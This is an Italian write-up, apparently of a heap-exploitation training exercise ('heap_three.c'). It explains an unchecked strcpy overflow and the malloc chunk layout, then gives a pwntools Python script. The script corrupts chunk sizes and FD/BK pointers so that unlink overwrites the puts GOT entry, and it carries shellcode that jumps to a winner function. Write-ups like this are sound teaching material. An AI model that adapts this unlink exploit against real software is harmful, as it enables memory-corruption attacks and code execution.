### Descrizione del Codice

Il programma `heap_three.c` esplora l'importanza di inizializzare esplicitamente la memoria allocata e cosa può accadere quando i valori dei puntatori diventano obsoleti.

### Funzionamento del Programma

1. Il programma alloca tre blocchi di memoria di 32 byte ciascuno.
2. Copia gli argomenti della riga di comando nei blocchi di memoria allocati.
3. Libera i blocchi di memoria allocati.
4. Stampa un messaggio di errore.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `strcpy` senza controllare la dimensione, il che può causare un overflow del buffer. Questo può essere sfruttato per manipolare la gestione della memoria heap.

### Struttura dei Blocchi di Memoria

Ogni blocco di memoria heap ha la seguente struttura:
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ <-- Inizio del blocco | PREV_SIZE (se P = 0) | +-----------------+-+-+-+-+-+ | CHUNK SIZE |A|M|P| +-----------------+-+-+-+-+-+ <-- Puntatore restituito da malloc | USER DATA | +---------------------------+ <-- Fine del blocco

Un blocco allocato consiste di tre parti: due intestazioni di 8 byte o 4 byte su sistemi a 64 bit/32 bit rispettivamente, e i dati dell'utente.

### Exploit

L'exploit sfrutta la vulnerabilità di overflow del buffer per manipolare i puntatori `FD` e `BK` dei blocchi di memoria liberati, consentendo di scrivere in memoria arbitraria.

### Esempio di Exploit

Il seguente script Python genera l'input necessario per sfruttare la vulnerabilità:

```python
# solve.py

from pwn import *

puts_addr = 0x804c13c
shellcode_addr = 0xf7e6900c

'''
  push 0x80487d5      # winner_address
  ret
'''
shellcode = '\x68\xd5\x87\x04\x08\xc3'

buff = ""

# primo blocco
buff += 'AAAA'            # Questo sarà sovrascritto con FD quando free(a)
buff += shellcode
buff += ' '

# secondo blocco
buff += 'B'*32            # Riempie il secondo blocco
buff += p32(0xfffffffc)   # prevsize del terzo blocco = -4 per saltare all'interno di se stesso durante la consolidazione all'indietro
buff += p32(0xffffffb0)   # size del terzo blocco = -80 per saltare al primo blocco durante la consolidazione in avanti
buff += ' '

# terzo blocco
buff += 'AAAA'            # junk
buff += p32(puts_addr-12) # sarà p->fd
buff += p32(shellcode_addr) # sarà p->bk

print(buff)